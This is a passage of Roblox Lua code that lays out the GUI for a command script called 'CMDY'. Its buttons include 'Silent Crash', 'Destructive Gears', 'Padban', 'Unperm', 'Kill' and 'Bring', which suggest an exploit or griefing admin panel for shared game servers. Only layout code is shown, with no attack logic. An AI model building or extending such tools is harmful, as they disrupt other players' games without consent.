	CMDY.FixColors.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.FixColors.TextSize = 14.000
	CMDY.FixColors.TextWrapped = true

	CMDY.frfrfrfrfrf_44.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_44.Parent = CMDY.FixColors

	CMDY.BtoolsV2Button.Name = "BtoolsV2Button"
	CMDY.BtoolsV2Button.Parent = CMDY.MiscP
	CMDY.BtoolsV2Button.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.BtoolsV2Button.Position = UDim2.new(0.544975877, 0, 0.443680286, 0)
	CMDY.BtoolsV2Button.Size = UDim2.new(0, 135, 0, 40)
	CMDY.BtoolsV2Button.Font = Enum.Font.JosefinSans
	CMDY.BtoolsV2Button.Text = "BtoolsV2"
	CMDY.BtoolsV2Button.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.BtoolsV2Button.TextSize = 14.000
	CMDY.BtoolsV2Button.TextWrapped = true

	CMDY.frfrfrfrfrf_45.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_45.Parent = CMDY.BtoolsV2Button

	CMDY.ColorMap.Name = "ColorMap"
	CMDY.ColorMap.Parent = CMDY.MiscP
	CMDY.ColorMap.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.ColorMap.Position = UDim2.new(0.0449758768, 0, 0.62055105, 0)
	CMDY.ColorMap.Size = UDim2.new(0, 135, 0, 40)
	CMDY.ColorMap.Font = Enum.Font.JosefinSans
	CMDY.ColorMap.Text = "Color Map:"
	CMDY.ColorMap.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ColorMap.TextSize = 14.000
	CMDY.ColorMap.TextWrapped = true

	CMDY.frfrfrfrfrf_46.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_46.Parent = CMDY.ColorMap

	CMDY.ColorFrame.Name = "ColorFrame"
	CMDY.ColorFrame.Parent = CMDY.ColorMap
	CMDY.ColorFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ColorFrame.Position = UDim2.new(0.800000012, 0, 0.298825055, 0)
	CMDY.ColorFrame.Size = UDim2.new(0, 18, 0, 16)

	CMDY.placeholder4.Name = "placeholder4"
	CMDY.placeholder4.Parent = CMDY.MiscP
	CMDY.placeholder4.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.placeholder4.Position = UDim2.new(0.544975877, 0, 0.62055105, 0)
	CMDY.placeholder4.Size = UDim2.new(0, 135, 0, 40)
	CMDY.placeholder4.Font = Enum.Font.JosefinSans
	CMDY.placeholder4.Text = "placeholder4"
	CMDY.placeholder4.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.placeholder4.TextSize = 14.000
	CMDY.placeholder4.TextWrapped = true

	CMDY.frfrfrfrfrf_47.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_47.Parent = CMDY.placeholder4

	CMDY.SilCrash.Name = "SilCrash"
	CMDY.SilCrash.Parent = CMDY.MiscP
	CMDY.SilCrash.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.SilCrash.Position = UDim2.new(0.291963816, 0, 0.783816338, 0)
	CMDY.SilCrash.Size = UDim2.new(0, 135, 0, 40)
	CMDY.SilCrash.Font = Enum.Font.JosefinSans
	CMDY.SilCrash.Text = "Silent Crash"
	CMDY.SilCrash.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.SilCrash.TextSize = 14.000
	CMDY.SilCrash.TextWrapped = true

	CMDY.frfrfrfrfrf_48.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_48.Parent = CMDY.SilCrash

	CMDY.GearsP.Name = "GearsP"
	CMDY.GearsP.Parent = CMDY.TabsContainer
	CMDY.GearsP.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.GearsP.Position = UDim2.new(1.0830158, 0, 0.0613396689, 0)
	CMDY.GearsP.Size = UDim2.new(0, 332, 0, 294)
	CMDY.GearsP.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CMDY.GearsP.Visible = false

	CMDY.frfrfrfrfrf_49.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_49.Parent = CMDY.GearsP

	CMDY.Gears.Name = "Gears"
	CMDY.Gears.Parent = CMDY.GearsP
	CMDY.Gears.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Gears.BackgroundTransparency = 1.000
	CMDY.Gears.Position = UDim2.new(0.315184563, 0, 0.000427559018, 0)
	CMDY.Gears.Size = UDim2.new(0, 123, 0, 18)
	CMDY.Gears.Font = Enum.Font.JosefinSans
	CMDY.Gears.Text = "Gears"
	CMDY.Gears.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Gears.TextScaled = true
	CMDY.Gears.TextSize = 14.000
	CMDY.Gears.TextWrapped = true

	CMDY.Guns.Name = "Guns"
	CMDY.Guns.Parent = CMDY.GearsP
	CMDY.Guns.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.Guns.Position = UDim2.new(0.520879507, 0, 0.0967414975, 0)
	CMDY.Guns.Size = UDim2.new(0, 135, 0, 40)
	CMDY.Guns.Font = Enum.Font.JosefinSans
	CMDY.Guns.Text = "Guns"
	CMDY.Guns.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Guns.TextSize = 14.000
	CMDY.Guns.TextWrapped = true

	CMDY.frfrfrfrfrf_50.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_50.Parent = CMDY.Guns

	CMDY.Swords.Name = "Swords"
	CMDY.Swords.Parent = CMDY.GearsP
	CMDY.Swords.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.Swords.Position = UDim2.new(0.0600361042, 0, 0.0967414975, 0)
	CMDY.Swords.Size = UDim2.new(0, 135, 0, 40)
	CMDY.Swords.Font = Enum.Font.JosefinSans
	CMDY.Swords.Text = "Swords"
	CMDY.Swords.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Swords.TextSize = 14.000
	CMDY.Swords.TextWrapped = true

	CMDY.frfrfrfrfrf_51.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_51.Parent = CMDY.Swords

	CMDY.FunGears.Name = "FunGears"
	CMDY.FunGears.Parent = CMDY.GearsP
	CMDY.FunGears.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.FunGears.Position = UDim2.new(0.0600361228, 0, 0.2770136, 0)
	CMDY.FunGears.Size = UDim2.new(0, 135, 0, 40)
	CMDY.FunGears.Font = Enum.Font.JosefinSans
	CMDY.FunGears.Text = "Fun Gears"
	CMDY.FunGears.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.FunGears.TextSize = 14.000
	CMDY.FunGears.TextWrapped = true

	CMDY.frfrfrfrfrf_52.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_52.Parent = CMDY.FunGears

	CMDY.ClientBtools.Name = "ClientBtools"
	CMDY.ClientBtools.Parent = CMDY.GearsP
	CMDY.ClientBtools.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.ClientBtools.Position = UDim2.new(0.520879507, 0, 0.2770136, 0)
	CMDY.ClientBtools.Size = UDim2.new(0, 135, 0, 40)
	CMDY.ClientBtools.Font = Enum.Font.JosefinSans
	CMDY.ClientBtools.Text = "Client Btools"
	CMDY.ClientBtools.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ClientBtools.TextSize = 14.000
	CMDY.ClientBtools.TextWrapped = true

	CMDY.frfrfrfrfrf_53.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_53.Parent = CMDY.ClientBtools

	CMDY.SSBtools.Name = "SSBtools"
	CMDY.SSBtools.Parent = CMDY.GearsP
	CMDY.SSBtools.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.SSBtools.Position = UDim2.new(0.0600361228, 0, 0.470891148, 0)
	CMDY.SSBtools.Size = UDim2.new(0, 135, 0, 40)
	CMDY.SSBtools.Font = Enum.Font.JosefinSans
	CMDY.SSBtools.Text = "SS Btools"
	CMDY.SSBtools.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.SSBtools.TextSize = 14.000
	CMDY.SSBtools.TextWrapped = true

	CMDY.frfrfrfrfrf_54.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_54.Parent = CMDY.SSBtools

	CMDY.Destructive.Name = "Destructive"
	CMDY.Destructive.Parent = CMDY.GearsP
	CMDY.Destructive.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.Destructive.Position = UDim2.new(0.520879507, 0, 0.470891148, 0)
	CMDY.Destructive.Size = UDim2.new(0, 135, 0, 40)
	CMDY.Destructive.Font = Enum.Font.JosefinSans
	CMDY.Destructive.Text = "Destructive Gears"
	CMDY.Destructive.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Destructive.TextSize = 14.000
	CMDY.Destructive.TextWrapped = true

	CMDY.frfrfrfrfrf_55.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_55.Parent = CMDY.Destructive

	CMDY.Explosives.Name = "Explosives"
	CMDY.Explosives.Parent = CMDY.GearsP
	CMDY.Explosives.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.Explosives.Position = UDim2.new(0.0600361228, 0, 0.657965958, 0)
	CMDY.Explosives.Size = UDim2.new(0, 135, 0, 40)
	CMDY.Explosives.Font = Enum.Font.JosefinSans
	CMDY.Explosives.Text = "Explosives"
	CMDY.Explosives.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Explosives.TextSize = 14.000
	CMDY.Explosives.TextWrapped = true

	CMDY.frfrfrfrfrf_56.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_56.Parent = CMDY.Explosives

	CMDY.Melees.Name = "Melees"
	CMDY.Melees.Parent = CMDY.GearsP
	CMDY.Melees.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.Melees.Position = UDim2.new(0.520879507, 0, 0.657965958, 0)
	CMDY.Melees.Size = UDim2.new(0, 135, 0, 40)
	CMDY.Melees.Font = Enum.Font.JosefinSans
	CMDY.Melees.Text = "Melees"
	CMDY.Melees.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Melees.TextSize = 14.000
	CMDY.Melees.TextWrapped = true

	CMDY.frfrfrfrfrf_57.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_57.Parent = CMDY.Melees

	CMDY.Rideables.Name = "Rideables"
	CMDY.Rideables.Parent = CMDY.GearsP
	CMDY.Rideables.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.Rideables.Position = UDim2.new(0.291963816, 0, 0.831435323, 0)
	CMDY.Rideables.Size = UDim2.new(0, 135, 0, 40)
	CMDY.Rideables.Font = Enum.Font.JosefinSans
	CMDY.Rideables.Text = "Rideables"
	CMDY.Rideables.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Rideables.TextSize = 14.000
	CMDY.Rideables.TextWrapped = true

	CMDY.frfrfrfrfrf_58.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_58.Parent = CMDY.Rideables

	CMDY.PlayersP.Name = "PlayersP"
	CMDY.PlayersP.Parent = CMDY.TabsContainer
	CMDY.PlayersP.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.PlayersP.Position = UDim2.new(1.0830158, 0, 0.0613396689, 0)
	CMDY.PlayersP.Size = UDim2.new(0, 332, 0, 294)
	CMDY.PlayersP.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CMDY.PlayersP.Visible = false

	CMDY.frfrfrfrfrf_59.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_59.Parent = CMDY.PlayersP

	CMDY.PlrList.Name = "PlrList"
	CMDY.PlrList.Parent = CMDY.PlayersP
	CMDY.PlrList.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.PlrList.BackgroundTransparency = 1.000
	CMDY.PlrList.Position = UDim2.new(0.0206342954, 0, 0.12832278, 0)
	CMDY.PlrList.Size = UDim2.new(0, 325, 0, 256)
	CMDY.PlrList.BorderSizePixel = 0

	CMDY.UIGridLayout.Parent = CMDY.PlrList
	CMDY.UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	CMDY.UIGridLayout.CellPadding = UDim2.new(0, 40, 0, 60)
	CMDY.UIGridLayout.CellSize = UDim2.new(0, 80, 0, 80)

	CMDY.PlayersLabel.Name = "PlayersLabel"
	CMDY.PlayersLabel.Parent = CMDY.PlayersP
	CMDY.PlayersLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.PlayersLabel.BackgroundTransparency = 1.000
	CMDY.PlayersLabel.Position = UDim2.new(0.315184563, 0, 0.000427559018, 0)
	CMDY.PlayersLabel.Size = UDim2.new(0, 123, 0, 18)
	CMDY.PlayersLabel.Font = Enum.Font.JosefinSans
	CMDY.PlayersLabel.Text = "Players"
	CMDY.PlayersLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.PlayersLabel.TextScaled = true
	CMDY.PlayersLabel.TextSize = 14.000
	CMDY.PlayersLabel.TextWrapped = true

	CMDY.CommandsP.Name = "CommandsP"
	CMDY.CommandsP.Parent = CMDY.TabsContainer
	CMDY.CommandsP.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.CommandsP.Position = UDim2.new(1.0830158, 0, 0.0613396689, 0)
	CMDY.CommandsP.Size = UDim2.new(0, 332, 0, 294)
	CMDY.CommandsP.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CMDY.CommandsP.Visible = false

	CMDY.frfrfrfrfrf_60.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_60.Parent = CMDY.CommandsP

	CMDY.Commands.Name = "Commands"
	CMDY.Commands.Parent = CMDY.CommandsP
	CMDY.Commands.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Commands.BackgroundTransparency = 1.000
	CMDY.Commands.Position = UDim2.new(0.315184563, 0, 0.000427559018, 0)
	CMDY.Commands.Size = UDim2.new(0, 123, 0, 18)
	CMDY.Commands.Font = Enum.Font.JosefinSans
	CMDY.Commands.Text = "Commands"
	CMDY.Commands.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Commands.TextScaled = true
	CMDY.Commands.TextSize = 14.000
	CMDY.Commands.TextWrapped = true

	CMDY.ScrollingFrame.Parent = CMDY.CommandsP
	CMDY.ScrollingFrame.Active = true
	CMDY.ScrollingFrame.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.ScrollingFrame.BorderSizePixel = 0
	CMDY.ScrollingFrame.Position = UDim2.new(0.0391566269, 0, 0.0884353742, 0)
	CMDY.ScrollingFrame.Size = UDim2.new(0, 303, 0, 225)
	CMDY.ScrollingFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
	CMDY.ScrollingFrame.ScrollBarThickness = 5

	CMDY.UIListLayout.Parent = CMDY.ScrollingFrame
	CMDY.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	CMDY.Command.Name = "Command"
	CMDY.Command.Parent = CMDY.ScrollingFrame
	CMDY.Command.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
	CMDY.Command.Position = UDim2.new(0, 0, 1.20147945e-07, 0)
	CMDY.Command.Size = UDim2.new(0, 303, 0, 30)
	CMDY.Command.Font = Enum.Font.JosefinSans
	CMDY.Command.TextWrapped = true
	CMDY.Command.Text = ""
	CMDY.Command.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Command.TextSize = 14.000
	CMDY.Command.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Command.Visible = false

	CMDY.EditableCommand.Name = "EditableCommand"
	CMDY.EditableCommand.Parent = CMDY.CommandsP.ScrollingFrame
	CMDY.EditableCommand.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
	CMDY.EditableCommand.Position = UDim2.new(0, 0, 1.20147945e-07, 0)
	CMDY.EditableCommand.Size = UDim2.new(0, 303, 0, 30)
	CMDY.EditableCommand.Font = Enum.Font.JosefinSans
	CMDY.EditableCommand.Text = "setlight/light - sets lighting to given setting (night, dusk, colorname (full)) say 'fix' to fix"
	CMDY.EditableCommand.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.EditableCommand.TextSize = 14.000
	CMDY.EditableCommand.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.EditableCommand.TextWrapped = true
	CMDY.EditableCommand.Visible = false

	CMDY.EDITCMD.Name = "EDITCMD"
	CMDY.EDITCMD.Parent = CMDY.EditableCommand
	CMDY.EDITCMD.BackgroundColor3 = Color3.fromRGB(97, 97, 97)
	CMDY.EDITCMD.Position = UDim2.new(0.808369756, 0, 0.166666672, 0)
	CMDY.EDITCMD.Size = UDim2.new(0, 42, 0, 20)
	CMDY.EDITCMD.Font = Enum.Font.SourceSans
	CMDY.EDITCMD.Text = "EDIT"
	CMDY.EDITCMD.TextYAlignment = Enum.TextYAlignment.Top
	CMDY.EDITCMD.TextXAlignment = Enum.TextXAlignment.Left
	CMDY.EDITCMD.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.EDITCMD.TextSize = 14.000

	CMDY.UICornerEDIT.Name = "UICornerEDIT"
	CMDY.UICornerEDIT.Parent = CMDY.EDITCMD


	CMDY.UICorner_13.Parent = CMDY.ScrollingFrame

	CMDY.SettingsP.Name = "SettingsP"
	CMDY.SettingsP.Parent = CMDY.TabsContainer
	CMDY.SettingsP.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.SettingsP.Position = UDim2.new(1.0830158, 0, 0.0613396689, 0)
	CMDY.SettingsP.Size = UDim2.new(0, 332, 0, 294)
	CMDY.SettingsP.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CMDY.SettingsP.Visible = false

	CMDY.frfrfrfrfrf_61.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_61.Parent = CMDY.SettingsP

	CMDY.Settings.Name = "Settings"
	CMDY.Settings.Parent = CMDY.SettingsP
	CMDY.Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Settings.BackgroundTransparency = 1.000
	CMDY.Settings.Position = UDim2.new(0.312802941, 0, 0.0147402734, 0)
	CMDY.Settings.Size = UDim2.new(0, 123, 0, 18)
	CMDY.Settings.Font = Enum.Font.JosefinSans
	CMDY.Settings.Text = "Settings"
	CMDY.Settings.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Settings.TextScaled = true
	CMDY.Settings.TextSize = 14.000
	CMDY.Settings.TextWrapped = true

	CMDY.TextLabel_5.Parent = CMDY.SettingsP
	CMDY.TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_5.BackgroundTransparency = 1.000
	CMDY.TextLabel_5.Position = UDim2.new(0.144578308, 0, 0.15646258, 0)
	CMDY.TextLabel_5.Size = UDim2.new(0, 88, 0, 25)
	CMDY.TextLabel_5.Font = Enum.Font.SourceSans
	CMDY.TextLabel_5.Text = "Chat Prefix:"
	CMDY.TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_5.TextScaled = true
	CMDY.TextLabel_5.TextSize = 14.000
	CMDY.TextLabel_5.TextWrapped = true

	CMDY.TextLabel_6.Parent = CMDY.SettingsP
	CMDY.TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_6.BackgroundTransparency = 1.000
	CMDY.TextLabel_6.Position = UDim2.new(0.189759046, 0, 0.293860495, 0)
	CMDY.TextLabel_6.Size = UDim2.new(0, 80, 0, 24)
	CMDY.TextLabel_6.Font = Enum.Font.SourceSans
	CMDY.TextLabel_6.Text = "Theme:"
	CMDY.TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_6.TextScaled = true
	CMDY.TextLabel_6.TextSize = 14.000
	CMDY.TextLabel_6.TextWrapped = true

	CMDY.TextLabel_7.Parent = CMDY.SettingsP
	CMDY.TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_7.BackgroundTransparency = 1.000
	CMDY.TextLabel_7.Position = UDim2.new(0.0421686731, 0, 0.426513582, 0)
	CMDY.TextLabel_7.Size = UDim2.new(0, 122, 0, 24)
	CMDY.TextLabel_7.Font = Enum.Font.SourceSans
	CMDY.TextLabel_7.Text = "CMDBar HotKey:"
	CMDY.TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_7.TextScaled = true
	CMDY.TextLabel_7.TextSize = 14.000
	CMDY.TextLabel_7.TextWrapped = true

	CMDY.TextLabel_8.Parent = CMDY.SettingsP
	CMDY.TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_8.BackgroundTransparency = 1.000
	CMDY.TextLabel_8.Position = UDim2.new(0.283132523, 0, 0.603384316, 0)
	CMDY.TextLabel_8.Size = UDim2.new(0, 122, 0, 24)
	CMDY.TextLabel_8.Font = Enum.Font.SourceSans
	CMDY.TextLabel_8.Text = "Credits"
	CMDY.TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_8.TextScaled = true
	CMDY.TextLabel_8.TextSize = 14.000
	CMDY.TextLabel_8.TextWrapped = true

	CMDY.TextLabel_9.Parent = CMDY.SettingsP
	CMDY.TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_9.BackgroundTransparency = 1.000
	CMDY.TextLabel_9.Position = UDim2.new(0.0602409691, 0, 0.705425262, 0)
	CMDY.TextLabel_9.Size = UDim2.new(0, 109, 0, 74)
	CMDY.TextLabel_9.Font = Enum.Font.SourceSans
	CMDY.TextLabel_9.Text = "Script - quiving#9135        Idea - Shortcut"
	CMDY.TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_9.TextSize = 14.000
	CMDY.TextLabel_9.TextWrapped = true

	CMDY.TextLabel_10.Parent = CMDY.SettingsP
	CMDY.TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_10.BackgroundTransparency = 1.000
	CMDY.TextLabel_10.Position = UDim2.new(0.596385539, 0, 0.705425262, 0)
	CMDY.TextLabel_10.Size = UDim2.new(0, 109, 0, 74)
	CMDY.TextLabel_10.Font = Enum.Font.SourceSans
	CMDY.TextLabel_10.Text = "Join the discord! .gg/VnWVvAMCBC"
	CMDY.TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_10.TextSize = 14.000
	CMDY.TextLabel_10.TextWrapped = true

	CMDY.Prefix.Name = "Prefix"
	CMDY.Prefix.Parent = CMDY.SettingsP
	CMDY.Prefix.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
	CMDY.Prefix.Position = UDim2.new(0.430722892, 0, 0.15646258, 0)
	CMDY.Prefix.Size = UDim2.new(0, 47, 0, 25)
	CMDY.Prefix.Font = Enum.Font.SourceSans
	CMDY.Prefix.Text = ";"
	CMDY.Prefix.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Prefix.TextSize = 14.000

	CMDY.UICorner_14.Parent = CMDY.Prefix

	CMDY.BarHotKey.Name = "BarHotKey"
	CMDY.BarHotKey.Parent = CMDY.SettingsP
	CMDY.BarHotKey.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
	CMDY.BarHotKey.Position = UDim2.new(0.430722892, 0, 0.428571433, 0)
	CMDY.BarHotKey.Size = UDim2.new(0, 47, 0, 25)
	CMDY.BarHotKey.Font = Enum.Font.SourceSans
	CMDY.BarHotKey.PlaceholderText = ".."
	CMDY.BarHotKey.Text = "'"
	CMDY.BarHotKey.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.BarHotKey.TextSize = 14.000

	CMDY.UICorner_15.Parent = CMDY.BarHotKey

	CMDY.GuiTheme.Name = "GuiTheme"
	CMDY.GuiTheme.Parent = CMDY.SettingsP
	CMDY.GuiTheme.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.GuiTheme.Position = UDim2.new(0.430722862, 0, 0.294135928, 0)
	CMDY.GuiTheme.Size = UDim2.new(0, 23, 0, 22)
	CMDY.GuiTheme.Text = ""

	local resbut = Instance.new("TextButton")
	resbut.Parent = CMDY.SettingsP
	resbut.Text = "RESET"
	resbut.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
	resbut.Position = UDim2.new(0.54, 0, 0.294135928, 0)
	resbut.Size = UDim2.new(0, 45, 0, 22)
	resbut.TextColor3 = Color3.fromRGB(255,255,255)
	local uicfr = Instance.new("UICorner")
	uicfr.Parent = resbut



	CMDY.UICorner_16.Parent = CMDY.Drop

	CMDY.PlayerMenu.Name = "PlayerMenu"
	CMDY.PlayerMenu.Parent = CMDY.Drop
	CMDY.PlayerMenu.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
	CMDY.PlayerMenu.Position = UDim2.new(0.23856926, 0, 0.0630843714, 0)
	CMDY.PlayerMenu.Size = UDim2.new(0, 266, 0, 266)
	CMDY.PlayerMenu.Visible = false

	CMDY.UICorner_17.Parent = CMDY.PlayerMenu

	CMDY.Player.Name = "Player"
	CMDY.Player.Parent = CMDY.PlayerMenu
	CMDY.Player.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Player.BackgroundTransparency = 1.000
	CMDY.Player.Position = UDim2.new(0.348021567, 0, 0.0239685215, 0)
	CMDY.Player.Size = UDim2.new(0, 80, 0, 78)
	CMDY.Player.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

	CMDY.UICorner_18.CornerRadius = UDim.new(0, 100)
	CMDY.UICorner_18.Parent = CMDY.Player

	CMDY.Whitelist.Name = "Whitelist"
	CMDY.Whitelist.Parent = CMDY.PlayerMenu
	CMDY.Whitelist.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
	CMDY.Whitelist.Position = UDim2.new(0.289473712, 0, 0.328188807, 0)
	CMDY.Whitelist.Size = UDim2.new(0, 112, 0, 23)
	CMDY.Whitelist.Font = Enum.Font.SourceSans
	CMDY.Whitelist.Text = "Whitelist"
	CMDY.Whitelist.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Whitelist.TextSize = 23.000

	CMDY.UICorner_19.Parent = CMDY.Whitelist

	CMDY.Blacklist.Name = "Blacklist"
	CMDY.Blacklist.Parent = CMDY.PlayerMenu
	CMDY.Blacklist.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
	CMDY.Blacklist.Position = UDim2.new(0.289473712, 0, 0.430643886, 0)
	CMDY.Blacklist.Size = UDim2.new(0, 112, 0, 23)
	CMDY.Blacklist.Font = Enum.Font.SourceSans
	CMDY.Blacklist.Text = "Blacklist"
	CMDY.Blacklist.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Blacklist.TextSize = 23.000

	CMDY.UICorner_20.Parent = CMDY.Blacklist

	CMDY.Padban.Name = "Padban"
	CMDY.Padban.Parent = CMDY.PlayerMenu
	CMDY.Padban.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
	CMDY.Padban.Position = UDim2.new(0.289473712, 0, 0.540282726, 0)
	CMDY.Padban.Size = UDim2.new(0, 112, 0, 23)
	CMDY.Padban.Font = Enum.Font.SourceSans
	CMDY.Padban.Text = "Padban"
	CMDY.Padban.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Padban.TextSize = 23.000

	CMDY.UICorner_21.Parent = CMDY.Padban

	CMDY.Unperm.Name = "Unperm"
	CMDY.Unperm.Parent = CMDY.PlayerMenu
	CMDY.Unperm.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
	CMDY.Unperm.Position = UDim2.new(0.289473712, 0, 0.64582324, 0)
	CMDY.Unperm.Size = UDim2.new(0, 112, 0, 23)
	CMDY.Unperm.Font = Enum.Font.SourceSans
	CMDY.Unperm.Text = "Unperm"
	CMDY.Unperm.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Unperm.TextSize = 23.000

	CMDY.UICorner_22.Parent = CMDY.Unperm

	CMDY.Teleport.Name = "Teleport"
	CMDY.Teleport.Parent = CMDY.PlayerMenu
	CMDY.Teleport.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
	CMDY.Teleport.Position = UDim2.new(0.289473683, 0, 0.756021857, 0)
	CMDY.Teleport.Size = UDim2.new(0, 52, 0, 23)
	CMDY.Teleport.Font = Enum.Font.SourceSans
	CMDY.Teleport.Text = "Bring"
	CMDY.Teleport.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Teleport.TextSize = 23.000

	CMDY.UICorner_23.Parent = CMDY.Teleport

	CMDY.Kill.Name = "Kill"
	CMDY.Kill.Parent = CMDY.PlayerMenu
	CMDY.Kill.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
	CMDY.Kill.Position = UDim2.new(0.289473712, 0, 0.86908108, 0)
	CMDY.Kill.Size = UDim2.new(0, 112, 0, 23)
	CMDY.Kill.Font = Enum.Font.SourceSans
	CMDY.Kill.Text = "Kill"
	CMDY.Kill.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Kill.TextSize = 23.000

	CMDY.UICorner_24.Parent = CMDY.Kill

	CMDY.GoTo.Name = "GoTo"
	CMDY.GoTo.Parent = CMDY.PlayerMenu
	CMDY.GoTo.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
	CMDY.GoTo.Position = UDim2.new(0.511278212, 0, 0.756021857, 0)
	CMDY.GoTo.Size = UDim2.new(0, 53, 0, 23)
